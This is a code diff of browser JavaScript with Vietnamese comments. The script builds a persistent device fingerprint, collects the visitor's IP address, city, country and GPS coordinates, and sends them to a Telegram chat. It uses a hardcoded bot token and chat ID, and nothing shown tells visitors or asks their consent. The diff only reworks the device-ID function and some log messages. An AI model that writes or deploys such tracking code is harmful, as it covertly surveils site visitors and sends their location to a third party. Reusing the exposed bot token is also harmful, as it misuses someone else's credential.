@@ -1,6 +1,21 @@
-const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
+const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ ĐỔI TOKEN MỚI
 const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn
 
+// 📌 Hàm tạo ID cố định cho thiết bị
+async function getFixedDeviceID() {
+    let deviceID = localStorage.getItem("fixedDeviceID"); // Lấy ID từ localStorage
+
+    if (!deviceID) {
+        const rawData = `${navigator.platform}|${navigator.hardwareConcurrency}|${screen.width}x${screen.height}`;
+        const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(rawData));
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        deviceID = hashArray.map(byte => byte.toString(36)).join("").slice(0, 12).toUpperCase();
+
+        localStorage.setItem("fixedDeviceID", deviceID); // Lưu ID vào trình duyệt
+    }
+
+    return deviceID === "443523S2W5MY" ? "443523S2W5MY Máy Chủ" : deviceID;
+}
 
 // 📌 Xác định tên trình duyệt
 function getBrowserName() {
@@ -46,18 +61,7 @@ async function getDeviceFingerprint() {
     };
 }
 
-// 📌 Tạo ID thiết bị cố định (dưới 12 ký tự)
-async function generateDeviceID() {
-    const fingerprint = await getDeviceFingerprint();
-    const data = `${fingerprint.browser}|${fingerprint.platform}|${fingerprint.cpuCores}|${fingerprint.gpu}|${fingerprint.ram}`;
-    
-    const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(data));
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    
-    return hashArray.map(byte => byte.toString(36)).join("").slice(0, 12).toUpperCase();
-}
-
-// 📌 Gửi thông tin đến Telegram
+// 📌 Lấy vị trí & gửi lên Telegram
 async function sendInfoToTelegram() {
     let city = "Không xác định", region = "Không xác định", country = "Không xác định";
     let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";
@@ -81,11 +85,12 @@ async function sendInfoToTelegram() {
         }
     }
 
-    const deviceID = await generateDeviceID();
     const fingerprint = await getDeviceFingerprint();
+    const deviceID = await getFixedDeviceID(); // Lấy ID thiết bị
     const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
     const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+    // ✉️ Gửi tin nhắn đến Telegram
     const message = `
 🔍 **THÔNG TIN TRUY CẬP**
 🆔 ID Thiết Bị: ${deviceID}
@@ -118,9 +123,9 @@ async function sendInfoToTelegram() {
                 parse_mode: "Markdown"
             })
         });
-        console.log("✅ Đã gửi thông tin đến Telegram");
+        console.log("Đã gửi thông tin đến Telegram");
     } catch (error) {
-        console.log("❌ Lỗi khi gửi thông tin đến Telegram:", error);
+        console.log("Lỗi khi gửi thông tin đến Telegram:", error);
     }
 }
 
